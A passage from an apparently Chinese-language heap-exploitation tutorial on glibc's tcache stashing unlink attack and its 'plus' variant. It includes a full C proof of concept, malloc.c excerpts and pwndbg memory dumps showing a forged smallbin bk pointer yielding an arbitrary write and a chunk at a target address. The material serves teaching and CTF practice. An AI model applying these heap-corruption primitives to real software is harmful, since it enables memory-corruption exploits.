class="hljs-number">0xb0</span>)     fastbin[<span class="hljs-number">9</span>]: <span class="hljs-number">0x0</span>                  top: <span class="hljs-number">0x555555559950</span> (size : <span class="hljs-number">0x206b0</span>)        last_remainder: <span class="hljs-number">0x5555555598c0</span> (size : <span class="hljs-number">0x60</span>)             unsortbin: <span class="hljs-number">0x5555555598c0</span> (size : <span class="hljs-number">0x60</span>)(<span class="hljs-number">0x60</span>)   tcache_entry[<span class="hljs-number">4</span>](<span class="hljs-number">6</span>): <span class="hljs-number">0x5555555594a0</span> --&gt; <span class="hljs-number">0x555555559440</span> --&gt; <span class="hljs-number">0x5555555593e0</span> --&gt; <span class="hljs-number">0x555555559380</span> --&gt; <span class="hljs-number">0x555555559320</span> --&gt; <span class="hljs-number">0x5555555592c0</span></code></pre></div><p>可以看到0x5555555598c0是在<code>last_remainder</code>之中的，由于其不会进入tcache的特性，就可以进入到smallbin中。</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; heapinfo(<span class="hljs-number">0x20</span>)     fastbin[<span class="hljs-number">0</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x30</span>)     fastbin[<span class="hljs-number">1</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x40</span>)     fastbin[<span class="hljs-number">2</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x50</span>)     fastbin[<span class="hljs-number">3</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x60</span>)     fastbin[<span class="hljs-number">4</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x70</span>)     fastbin[<span class="hljs-number">5</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x80</span>)     fastbin[<span class="hljs-number">6</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x90</span>)     fastbin[<span class="hljs-number">7</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0xa0</span>)     fastbin[<span class="hljs-number">8</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0xb0</span>)     fastbin[<span class="hljs-number">9</span>]: <span class="hljs-number">0x0</span>                  top: <span class="hljs-number">0x555555559a60</span> (size : <span class="hljs-number">0x205a0</span>)        last_remainder: <span class="hljs-number">0x5555555598c0</span> (size : <span class="hljs-number">0x60</span>)             unsortbin: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x060</span>)  smallbin[ <span class="hljs-number">4</span>]: <span class="hljs-number">0x5555555598c0</span>(<span class="hljs-number">0x60</span>)   tcache_entry[<span class="hljs-number">4</span>](<span class="hljs-number">6</span>): <span class="hljs-number">0x5555555594a0</span> --&gt; <span class="hljs-number">0x555555559440</span> --&gt; <span class="hljs-number">0x5555555593e0</span> --&gt; <span class="hljs-number">0x555555559380</span> --&gt; <span class="hljs-number">0x555555559320</span> --&gt; <span class="hljs-number">0x5555555592c0</span></code></pre></div><p>接着重复这个步骤，在构造一个进入smallbin的chunk。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"Repeat the above steps, and free another chunk into corresponding smallbin\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n"</span>);s2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>); <span class="hljs-comment">//防止合并的pad chunk，其必须大于0x60</span><span class="hljs-built_in">free</span>(s2);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);</code></pre></div><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; heapinfo(<span class="hljs-number">0x20</span>)     fastbin[<span class="hljs-number">0</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x30</span>)     fastbin[<span class="hljs-number">1</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x40</span>)     fastbin[<span class="hljs-number">2</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x50</span>)     fastbin[<span class="hljs-number">3</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x60</span>)     fastbin[<span class="hljs-number">4</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x70</span>)     fastbin[<span class="hljs-number">5</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x80</span>)     fastbin[<span class="hljs-number">6</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x90</span>)     fastbin[<span class="hljs-number">7</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0xa0</span>)     fastbin[<span class="hljs-number">8</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0xb0</span>)     fastbin[<span class="hljs-number">9</span>]: <span class="hljs-number">0x0</span>                  top: <span class="hljs-number">0x55555555a030</span> (size : <span class="hljs-number">0x1ffd0</span>)        last_remainder: <span class="hljs-number">0x555555559e30</span> (size : <span class="hljs-number">0x60</span>)             unsortbin: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x060</span>)  smallbin[ <span class="hljs-number">4</span>]: <span class="hljs-number">0x555555559e30</span>  &lt;--&gt; <span class="hljs-number">0x5555555598c0</span>(<span class="hljs-number">0x60</span>)   tcache_entry[<span class="hljs-number">4</span>](<span class="hljs-number">6</span>): <span class="hljs-number">0x5555555594a0</span> --&gt; <span class="hljs-number">0x555555559440</span> --&gt; <span class="hljs-number">0x5555555593e0</span> --&gt; <span class="hljs-number">0x555555559380</span> --&gt; <span class="hljs-number">0x555555559320</span> --&gt; <span class="hljs-number">0x5555555592c0</span></code></pre></div><p>可以看到已经完成构造了。接着进行change 0x555555559e30 的bk为目标地址-0x10。</p><div class="hljs"><pre><code class="hljs c">*(<span class="hljs-keyword">uint64_t</span>*)((s2+<span class="hljs-number">0x3c0</span>)+<span class="hljs-number">0x18</span>) = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>;</code></pre></div><p>原始：</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555559e30</span><span class="hljs-number">0x555555559e30</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000061</span><span class="hljs-number">0x555555559e40</span>: <span class="hljs-number">0x00005555555598c0</span>      <span class="hljs-number">0x00007ffff7fb9c30</span></code></pre></div><p>change 后：</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555559e30</span><span class="hljs-number">0x555555559e30</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000061</span><span class="hljs-number">0x555555559e40</span>: <span class="hljs-number">0x00005555555598c0</span>      <span class="hljs-number">0x0000555555558040</span><span class="hljs-number">0x555555559e50</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div><p>再看下即将被calloc申请到的smallbin：</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x5555555598c0</span><span class="hljs-number">0x5555555598c0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000061</span><span class="hljs-number">0x5555555598d0</span>: <span class="hljs-number">0x00007ffff7fb9c30</span>      <span class="hljs-number">0x0000555555559e30</span></code></pre></div><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);</code></pre></div><p>其先会进行一个解链：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (in_smallbin_range (nb))   &#123;     idx = smallbin_index (nb);     bin = bin_at (av, idx);     <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)       &#123;         bck = victim-&gt;bk; <span class="hljs-comment">//1</span>     <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="hljs-comment">//2 明显是可以通过其双向链表的检查，会被正常的解链</span>       malloc_printerr (<span class="hljs-string">"malloc(): smallbin double linked list corrupted"</span>);         set_inuse_bit_at_offset (victim, nb);         bin-&gt;bk = bck;         bck-&gt;fd = bin;         <span class="hljs-keyword">if</span> (av != &amp;main_arena)       set_non_main_arena (victim);         check_malloced_chunk (av, victim, nb);</code></pre></div><p>接着会进行stash：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span>      <span class="hljs-comment">/* While we're here, if we see other chunks of the same size,         stash them in the tcache.  */</span>      <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (nb);      <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)        &#123;          mchunkptr tc_victim;          <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span>          <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count             &amp;&amp; (tc_victim = last (bin)) != bin)        &#123;          <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)            &#123;              bck = tc_victim-&gt;bk;              set_inuse_bit_at_offset (tc_victim, nb);              <span class="hljs-keyword">if</span> (av != &amp;main_arena)            set_non_main_arena (tc_victim);              bin-&gt;bk = bck;              bck-&gt;fd = bin;              tcache_put (tc_victim, tc_idx);                &#125;        &#125;</code></pre></div><p>可以看到这一块，并没有进行双向链表的检查。其中<code>bck-&gt;fd = bin;</code>这个也就是对于 (&amp;tag - 0x10) + 0x10 = bin。也就是将目标地址上的值赋为 bin，这样就实现了等价于 unsortedbin Attack 的操作。</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x0000555555558050</span><span class="hljs-number">0x555555558050</span> &lt;victim&gt;:        <span class="hljs-number">0x00007ffff7fb9c30</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div><p>可以看到攻击已经成功。</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x60</span>)   tcache_entry[4](7): 0x555555559e40 --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x5555555594a0</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x555555559440</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x5555555593e0</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x555555559380</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x555555559320</span> --&gt;</span> <span class="hljs-number">0</span>x5555555592c0</code></pre></div><p>且已经满chain，结束了stash的过程。</p><p>需要注意的是，刚才描述的放入过程是一个循环，我们将伪造的bck看成一个堆块，其bk很可能是一个非法的地址，这样就导致循环到下一个堆块时unlink执行到<code>bck-&gt;fd = bin;</code>访问非法内存造成程序crash。所以开始，选择释放6个对应size的chunk到tcache bin，只为tcache留一个空间，这样循环一次就会跳出，不会有后续问题。</p><h4 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h4><ul><li>先放入 2 个 Chunk 到 smallbins，6 个 Chunk 到对应的 tcache；</li><li>然后在不破坏 fd 的情况下,将后放入 smallbins 的 chunk 的 bk 设置为目标地址减 0x10。</li><li>这样再用calloc向 smallbins 申请对应大小的 Chunk 时，先放入 smallbins 的 Chunk 被分配给用户，然后触发 stash 机制。<code>bck = tc_victim-&gt;bk;</code>此时的 bck 就是目标地址减 0x10，之后<code>bck-&gt;fd = bin;</code> 也就是将目标地址上的值赋为 bin，写上了<code>main_arena</code>的地址，这样就实现了等价于 unsortedbin attack 的操作；</li><li>之后再调用 <code>tcache_put</code> 把后放入 smallbins 的 Chunk 取出给对应的 tcache ，因为 tcache 之前已经被布置了 6 个 Chunk，在这次之后达到了阈值，所以也就退出了 stash 循环，整个流程就会正常结束。</li></ul><h3 id="tcache-stashing-unlink-plus"><a href="#tcache-stashing-unlink-plus" class="headerlink" title="tcache_stashing_unlink plus"></a><code>tcache_stashing_unlink plus</code></h3><h4 id="示例代码-1"><a href="#示例代码-1" class="headerlink" title="示例代码"></a>示例代码</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;inttypes.h&gt;</span></span><span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> victim[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span>&#123;setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);<span class="hljs-keyword">char</span> *t1;<span class="hljs-keyword">char</span> *s1, *s2, *pad;<span class="hljs-keyword">char</span> *tmp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"You can use this technique to get a tcache chunk to arbitrary address\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n1. need to know heap address and the victim address that you need to attack\n"</span>);tmp = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim's address: %p, victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n"</span>, &amp;victim, victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"heap address: %p\n"</span>, tmp<span class="hljs-number">-0x260</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n2. change victim's data, make victim[1] = &amp;victim, or other address to writable address\n"</span>);<span class="hljs-comment">//只要是一个可以写的指针地址即可，不一定是&amp;victim</span>victim[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n"</span>, victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n3. choose a stable size and free five identical size chunks to tcache_entry list\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Here, I choose the size 0x60\n"</span>);<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">5</span>; i++)&#123;t1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<span class="hljs-built_in">free</span>(t1);&#125;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n"</span>, t1, t1<span class="hljs-number">-0x60</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">2</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">3</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">4</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n"</span>);s1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a chunk %p, whose size is beyond tcache size threshold\n"</span>, s1);pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a padding chunk, avoid %p to merge to top chunk\n"</span>, s1);<span class="hljs-built_in">free</span>(s1);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Free chunk %p to unsortedbin\n"</span>, s1);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n"</span>);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"chunk %p is in smallbin[4], whose size is 0x60\n"</span>, s1+<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Repeat the above steps, and free another chunk into corresponding smallbin\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n"</span>);s2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<span class="hljs-built_in">free</span>(s2);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"chunk %p is in smallbin[4], whose size is 0x60\n"</span>, s2+<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"smallbin[4] list is %p &lt;--&gt; %p\n"</span>, s2+<span class="hljs-number">0x3c0</span>, s1+<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n5. overwrite the first chunk in smallbin[4]'s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Change %p's bk pointer to &amp;victim-0x10 address: 0x%lx\n"</span>, s2+<span class="hljs-number">0x3c0</span>, (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>);*(<span class="hljs-keyword">uint64_t</span>*)((s2+<span class="hljs-number">0x3c0</span>)+<span class="hljs-number">0x18</span>) = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n"</span>);<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n"</span>, &amp;victim, s2+<span class="hljs-number">0x3d0</span>, t1, t1<span class="hljs-number">-0x60</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">2</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">3</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">4</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Apply to tcache_entry[4], you can get a pointer to victim address\n"</span>);<span class="hljs-keyword">uint64_t</span> *r = (<span class="hljs-keyword">uint64_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>);r[<span class="hljs-number">0</span>] = <span class="hljs-number">0xaa</span>;r[<span class="hljs-number">1</span>] = <span class="hljs-number">0xbb</span>;r[<span class="hljs-number">2</span>] = <span class="hljs-number">0xcc</span>;r[<span class="hljs-number">3</span>] = <span class="hljs-number">0xdd</span>;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n"</span>, victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>由于大多地方调试信息都相似，只分析一下重点处的相关信息：</p><h4 id="重点调试过程"><a href="#重点调试过程" class="headerlink" title="重点调试过程"></a>重点调试过程</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-selector-tag">b</span> <span class="hljs-number">70</span></code></pre></div><p>先断在源程序代码的第70行，下面紧跟着的是calloc.<br>看下内存信息：<br>被恶意chage的smallbin chunk：</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555559dd0</span><span class="hljs-number">0x555555559dd0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000061</span><span class="hljs-number">0x555555559de0</span>: <span class="hljs-number">0x0000555555559860</span>      <span class="hljs-number">0x0000555555558050</span>(tag<span class="hljs-number">-0x10</span>)</code></pre></div><p>即将被取走的smallbin chunk：</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x0000555555559860</span><span class="hljs-number">0x555555559860</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000061</span><span class="hljs-number">0x555555559870</span>: <span class="hljs-number">0x00007ffff7fbac30</span>      <span class="hljs-number">0x0000555555559dd0</span></code></pre></div><p>接着si进入calloc内部,进入malloc.c：</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; b <span class="hljs-number">3654</span>Breakpoint <span class="hljs-number">3</span> at <span class="hljs-number">0x7ffff7e69c87</span>: file malloc.c, line <span class="hljs-number">3655.</span></code></pre></div><p>直接断在stash区进行分析:</p><h5 id="第一轮的stash："><a href="#第一轮的stash：" class="headerlink" title="第一轮的stash："></a>第一轮的stash：</h5><div class="hljs"><pre><code class="hljs c"> <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)&#123;  mchunkptr tc_victim;  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span>  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin)   <span class="hljs-comment">//#define last(b)      ((b)-&gt;bk)  也就是 tc_victim = bin-&gt;bk</span></code></pre></div><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; p tc_victim$<span class="hljs-number">19</span> = (mchunkptr) <span class="hljs-number">0x555555559dd0</span></code></pre></div><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555559dd0</span><span class="hljs-number">0x555555559dd0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000061</span><span class="hljs-number">0x555555559de0</span>: <span class="hljs-number">0x00007ffff7fbac30</span>      <span class="hljs-number">0x0000555555558050</span></code></pre></div><div class="hljs"><pre><code class="hljs c">&#123;  <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)&#123;  bck = tc_victim-&gt;bk; <span class="hljs-comment">//bck = tag-0x10</span>  set_inuse_bit_at_offset (tc_victim, nb);  <span class="hljs-keyword">if</span> (av != &amp;main_arena)set_non_main_arena (tc_victim);  bin-&gt;bk = bck; <span class="hljs-comment">//tag - 0x10 被写在bin-&gt;bk处</span>  bck-&gt;fd = bin; <span class="hljs-comment">//bin 被写在tag处</span>  <span class="hljs-comment">//将 bin 的 bk 指向 tc_victim 的后一个 Chunk，将 tc_victim 后一个 Chunk 的 fd 指向 bin，即将 tc_victim 取出</span>  tcache_put (tc_victim, tc_idx);&#125;&#125;</code></pre></div><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x0000555555558050</span><span class="hljs-number">0x555555558050</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x555555558060</span> &lt;victim&gt;:        <span class="hljs-number">0x00007ffff7fbac30</span>      <span class="hljs-number">0x0000555555558060</span><span class="hljs-number">0x555555558070</span> &lt;victim+<span class="hljs-number">16</span>&gt;:     <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x00007ffff7fbac30</span><span class="hljs-number">0x7ffff7fbac30</span> &lt;main_arena+<span class="hljs-number">176</span>&gt;:        <span class="hljs-number">0x00007ffff7fbac20</span>      <span class="hljs-number">0x00007ffff7fbac20</span><span class="hljs-number">0x7ffff7fbac40</span> &lt;main_arena+<span class="hljs-number">192</span>&gt;:        <span class="hljs-number">0x0000555555559dd0</span>      <span class="hljs-number">0x0000555555558050</span>（tag - <span class="hljs-number">0x10</span>）</code></pre></div><p>tcache 放入了 <code>tc_victim = 0x555555559de0</code></p><div class="hljs"><pre><code class="hljs undefined">(0x60)   tcache_entry[<span class="hljs-string">4</span>](<span class="hljs-link">6</span>): 0x555555559de0 --&gt; 0x555555559440 --&gt; 0x5555555593e0 --&gt; 0x555555559380 --&gt; 0x555555559320 --&gt; 0x5555555592c0</code></pre></div><h5 id="第二轮的stash："><a href="#第二轮的stash：" class="headerlink" title="第二轮的stash："></a>第二轮的stash：</h5><p>重点攻击的是<code>tc_victim</code> 也就是目标地址。</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; p tc_victim$<span class="hljs-number">21</span> = (mchunkptr) <span class="hljs-number">0x555555558050</span></code></pre></div><p>很明显最终目标也就是保证让<code>tc_victim</code>放入tcache即可。观察代码，可以发现仅需要保证的也就是不要让程序crush。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//得保证目标地址chunk的bk为可写的指针</span>  bck = tc_victim-&gt;bk; <span class="hljs-comment">//tag-0x10-&gt;bk=bck =tag+8 </span>  set_inuse_bit_at_offset (tc_victim, nb);  <span class="hljs-keyword">if</span> (av != &amp;main_arena)set_non_main_arena (tc_victim);  bin-&gt;bk = bck;  bck-&gt;fd = bin; <span class="hljs-comment">//保证一个可写的bck，程序即可正常的执行</span>  <span class="hljs-comment">//将 bin 的 bk 指向 tc_victim 的后一个 Chunk，将 tc_victim 后一个 Chunk 的 fd 指向 bin，即将 tc_victim 取出</span>  tcache_put (tc_victim, tc_idx);</code></pre></div><p>其得保证<code>tc_victim-&gt;bk</code>是一个可写指针，此示例程序是<code>&amp;victim</code>，是其他的也是可以的。</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555558050</span><span class="hljs-number">0x555555558050</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x555555558060</span> &lt;victim&gt;:        <span class="hljs-number">0x00007ffff7fbac30</span>      <span class="hljs-number">0x0000555555558060</span><span class="hljs-number">0x555555558070</span> &lt;victim+<span class="hljs-number">16</span>&gt;:     <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; p bck$<span class="hljs-number">22</span> = (mchunkptr) <span class="hljs-number">0x555555558060</span> &lt;victim&gt;</code></pre></div><p>执行完毕后，获得一个目标地址的chunk进入了tcache，也达到了阈值，也就退出了 stash 循环。<br>并且再次申请一下就得到一个目标地址的chunk。</p><div class="hljs"><pre><code class="hljs undefined">(<span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x60</span>)   tcache_entry[4](7): 0x555555558060 --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x555555559de0</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x555555559440</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x5555555593e0</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x555555559380</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x555555559320</span> --&gt;</span> <span class="hljs-number">0</span>x5555555592c0</code></pre></div><h4 id="小总结-1"><a href="#小总结-1" class="headerlink" title="小总结"></a>小总结</h4><ul><li>先放入 2 个 Chunk 到 Smallbins，5 个 Chunk 到对应的 tcache</li><li>在不破坏 fd 的情况下，<strong>将后放入 Smallbins 的 Chunk 的 bk 设置为目标地址减 0x10，同时要将目标地址加 0x8 处的值设置为一个指向一处可写内存的指针；</strong></li><li>接着用calloc触发stash 机制，会将后放入 Smallbins 的 Chunk 被放入 tcache，此时的 bin-&gt;bk 就是目标地址减 0x10，相当于把目标地址减 0x10 的指针链接进了 smallbins 中。</li><li>之后不满足终止条件，会进行下一次的 stash，这时的 <code>tc_victim</code> 就是目标地址。接下来由于原来的设置，目标地址加 0x8 处的指针是一个可写指针，保证stash流程正常走完。</li><li>最后目标地址就会被放入 <code>tcache_entry</code>的头部，stash 满足终止条件而终止。</li></ul><p>重点在攻击最后一个进入smallbin的bk指针，让其指向目标地址-0x10的地方，并且<strong>保证目标地址+8的位置为一个可写的指针。</strong></p><h3 id="tcache-stashing-unlink-plus-plus"><a href="#tcache-stashing-unlink-plus-plus" class="headerlink" title="tcache_stashing_unlink plus 